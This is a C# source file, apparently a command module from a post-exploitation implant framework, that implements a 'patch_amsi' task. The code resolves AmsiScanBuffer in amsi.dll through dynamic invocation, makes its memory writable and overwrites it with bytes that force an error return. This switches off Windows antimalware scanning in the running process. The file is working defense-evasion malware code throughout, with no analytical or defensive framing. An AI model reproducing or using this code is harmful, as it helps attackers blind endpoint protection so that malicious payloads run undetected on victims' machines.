using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using DynamicEngLoading;


namespace Engineer.Commands
{
    internal class Patch_AMSI : EngineerCommand
    {
        public override string Name => "patch_amsi";

        public override async Task Execute(EngineerTask task)
        {
            try
            {                
                if(IntPtr.Size == 8)
                {
                    byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
                    Patch( patch);
                }
                else
                {
                    byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
                    Patch( patch);
                }



                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("AMSI Patched with D/Invoke",task,EngTaskStatus.Complete,TaskResponseType.String);
            }
            catch (Exception e)
            {
                var error = "error: " + "[!] {patch failed}" + e.Message;
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(error,task,EngTaskStatus.Failed,TaskResponseType.String);
            }
        }
        
        private static void Patch(byte[] patch)
        {
            //get the address of the function
            IntPtr ModuleBase = DynInv.GetPebLdrModuleEntry("amsi.dll");
            IntPtr functionAddress = DynInv.GetExportAddress(ModuleBase, "AmsiScanBuffer");

            //make the address writable, I wanted to use getSyscallStub but with NtAllocateVirtualMemory and NtPtotect being called fro ma ammped version of the dll, its kind of pointless to use the syscall stub.
            uint oldProtect =  h_DynInv_Methods.NtFuncWrapper.NtProtectVirtualMemory(Process.GetCurrentProcess().Handle, ref functionAddress, patch.Length, (uint)h_DynInv.Win32.Kernel32.MemoryProtection.ReadWrite);

            // Patch function
            Marshal.Copy(patch, 0, functionAddress, patch.Length);

            // Restore memory permissions
            uint newProtect = new uint();
            h_DynInv_Methods.NtFuncWrapper.NtProtectVirtualMemory(Process.GetCurrentProcess().Handle, ref functionAddress, patch.Length, oldProtect);

        }
    }
}
